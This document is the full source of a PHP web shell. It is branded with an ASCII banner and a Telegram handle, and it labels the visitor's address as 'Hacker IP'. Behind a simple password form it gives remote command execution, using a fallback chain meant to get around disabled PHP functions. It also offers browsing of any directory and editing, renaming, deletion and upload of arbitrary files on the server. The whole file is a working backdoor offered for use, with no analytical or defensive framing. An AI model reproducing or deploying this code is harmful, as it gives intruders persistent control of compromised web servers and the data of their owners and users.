<?php
// Authentication (Optional: Set a password to access the shell)
$auth_pass = "yourpassword"; // Ganti dengan password yang kuat!
session_start();
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $auth_pass) {
        $_SESSION['authenticated'] = true;
    } else {
        echo '<form method="POST">Password: <input type="password" name="pass"><input type="submit"></form>';
        exit();
    }
}

// Error Reporting for Debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Function to bypass restricted functions using system calls
function safe_exec($cmd) {
    if (function_exists('exec')) {
        exec($cmd, $output);
        return implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        return shell_exec($cmd);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
        return $output;
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
        return $output;
    } else {
        return "Command execution not available!";
    }
}

// Get current directory and handle navigation
$current_dir = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = getcwd();
}
chdir($current_dir); // Change to the current directory

// Breadcrumb-style clickable Pwd
function getBreadcrumbPath($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumb = "";
    $full_path = "";

    foreach ($parts as $part) {
        if ($part === "") continue; // Skip empty parts for the root
        $full_path .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb .= "<a href='?path=" . urlencode($full_path) . "'>$part</a>" . DIRECTORY_SEPARATOR;
    }

    return $breadcrumb;
}

// Display system information
echo "<pre>
            _                                                            
   ___ __ _| |_ ___ _ __ ___  ___ __ _ _ __ ___     ___ ___  _ __ _ __   
  / __/ _` | __/ _ \ '__/ __|/ __/ _` | '_ ` _ \   / __/ _ \| '__| '_ \  
 | (_| (_| | ||  __/ |  \__ \ (_| (_| | | | | | | | (_| (_) | |  | |_) | 
  \___\__,_|\__\___|_|  |___/\___\__,_|_| |_| |_|  \___\___/|_|  | .__(_) https://t.me/caterscam
                                                                 |_|         
</pre>";

echo "<h3>Server Info:</h3>";
echo "Server IP: " . $_SERVER['SERVER_ADDR'] . "<br>";  // Server's IP Address
echo "Hacker IP: " . $_SERVER['REMOTE_ADDR'] . "<br>";  // Visitor/Hacker's IP Address
echo "User: " . trim(safe_exec('whoami')) . "<br>";     // Current user (whoami)
echo "Pwd: " . getBreadcrumbPath($current_dir) . "<br><br>"; // Clickable breadcrumb Pwd

// File Explorer Layout
echo "<h3>File Explorer:</h3>";
$files = @scandir($current_dir); // Suppress errors in case of restricted paths
if ($files === false) {
    echo "Directory listing failed! Trying alternative methods.<br>";
    $files = explode("\n", safe_exec("ls -1 " . escapeshellarg($current_dir)));
}

foreach ($files as $file) {
    // Skip current and parent directory references
    if ($file === "." || $file === "..") continue;

    // Determine if it's a directory or file
    $file_path = realpath($current_dir . DIRECTORY_SEPARATOR . $file);
    $is_dir = is_dir($file_path);

    // Format output for directories and files
    $file_name = $is_dir ? "<a href='?path=" . urlencode($file_path) . "'>$file</a>" : "<a href='?edit=" . urlencode($file_path) . "'>$file</a>";
    $actions = "[<a href='?delete=" . urlencode($file_path) . "'>Delete</a>] [<a href='?edit=" . urlencode($file_path) . "'>Edit</a>] [<a href='?rename=" . urlencode($file_path) . "'>Rename</a>]";
    
    // Display file or directory with actions
    echo "$file_name $actions<br>";
}

// File Editing
if (isset($_GET['edit'])) {
    $file_to_edit = realpath($_GET['edit']);
    if (is_file($file_to_edit)) {
        $content = htmlspecialchars(file_get_contents($file_to_edit));
        echo "<h3>Editing '$file_to_edit':</h3>";
        echo "<form method='POST'>";
        echo "<textarea name='file_content' rows='10' cols='50'>$content</textarea><br>";
        echo "<input type='hidden' name='edit_file' value='" . htmlspecialchars($file_to_edit) . "'>";
        echo "<input type='submit' value='Save'>";
        echo "</form>";
    }
}

// Save edited file
if (isset($_POST['file_content']) && isset($_POST['edit_file'])) {
    file_put_contents($_POST['edit_file'], $_POST['file_content']);
    echo "File saved!";
}

// File Renaming
if (isset($_GET['rename'])) {
    $file_to_rename = realpath($_GET['rename']);
    echo "<h3>Renaming '$file_to_rename':</h3>";
    echo "<form method='POST'>";
    echo "<input type='hidden' name='rename_old' value='" . htmlspecialchars($file_to_rename) . "'>";
    echo "New name: <input type='text' name='rename_new' value='" . htmlspecialchars(basename($file_to_rename)) . "'><br>";
    echo "<input type='submit' value='Rename'>";
    echo "</form>";
}

if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $old_name = $_POST['rename_old'];
    $new_name = dirname($old_name) . DIRECTORY_SEPARATOR . $_POST['rename_new'];
    if (rename($old_name, $new_name)) {
        echo "Renamed '$old_name' to '$new_name'.<br>";
    } else {
        echo "Failed to rename '$old_name'.<br>";
    }
}

// File Deletion with Confirmation
if (isset($_GET['delete'])) {
    $file_to_delete = realpath($_GET['delete']);
    if (unlink($file_to_delete)) {
        echo "File '$file_to_delete' deleted successfully.<br>";
    } else {
        echo "Failed to delete '$file_to_delete'.<br>";
    }
}

// Upload Form
echo "<h3>Upload a File:</h3>";
echo "<form enctype='multipart/form-data' method='POST'>
        <input type='file' name='upload'>
        <input type='submit' value='Upload'>
      </form>";

// File Upload Handler
if (isset($_FILES['upload'])) {
    $target_path = basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target_path)) {
        echo "File " . basename($_FILES['upload']['name']) . " uploaded successfully.<br>";
    } else {
        echo "Upload failed.<br>";
    }
}

// CMD Terminal Functionality
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<h3>Command Output:</h3>";
    echo "<pre>" . htmlspecialchars(safe_exec($cmd)) . "</pre>";
}

echo "<h3>Execute Command:</h3>";
echo "<form method='POST'>";
echo "Command: <input type='text' name='cmd'>";
echo "<input type='submit' value='Run'>";
echo "</form>";
?>
